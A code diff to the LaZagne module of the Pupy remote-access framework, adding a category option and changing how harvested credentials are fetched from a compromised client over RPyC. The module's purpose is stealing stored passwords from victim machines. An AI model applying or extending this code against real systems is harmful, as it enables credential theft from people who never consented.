@@ -6,6 +6,7 @@ from pupylib.PupyCompleter import *
 from rpyc.utils.classic import upload
 from pupylib.utils.credentials import Credentials
 from pupylib.utils.term import colorize
+from pupylib.utils.rpyc_utils import obtain
 import tempfile
 import subprocess
 import os.path
@@ -20,7 +21,7 @@ class LaZagne(PupyModule):
     """
 
     dependencies = {
-        'all': [ 'sqlite3', '_sqlite3', 'xml', '_elementtree',
+        'all': [ 'whole', 'sqlite3', '_sqlite3', 'xml', '_elementtree',
                      'calendar', 'xml', 'xml.etree', 'colorama',
                      'memorpy', 'ConfigParser', 'Crypto.Util.asn1', 'Crypto.PublicKey', 'lazagne', 'laZagne'],
         'windows': [ 'sqlite3.dll', 'win32crypt', 'win32api', 'win32con', 'win32cred',
@@ -38,6 +39,7 @@ class LaZagne(PupyModule):
         header += '|====================================================================|\n\n'
 
         self.arg_parser = PupyArgumentParser(prog="lazagne", description=header + self.__doc__)
+        self.arg_parser.add_argument('category', nargs='?', help='specify category', default='all')
 
     def run(self, args):
         db = Credentials(
@@ -46,7 +48,12 @@ class LaZagne(PupyModule):
 
         first_user = True
         passwordsFound = False
-        for r in self.client.conn.modules["laZagne"].runLaZagne():
+        results = obtain(
+            self.client.conn.modules["whole"].to_strings_list(
+                self.client.conn.modules["laZagne"].runLaZagne,
+                category_choosed=args.category
+            ))
+        for r in results:
 
             if r[0] == 'User':
                 if not passwordsFound and not first_user:
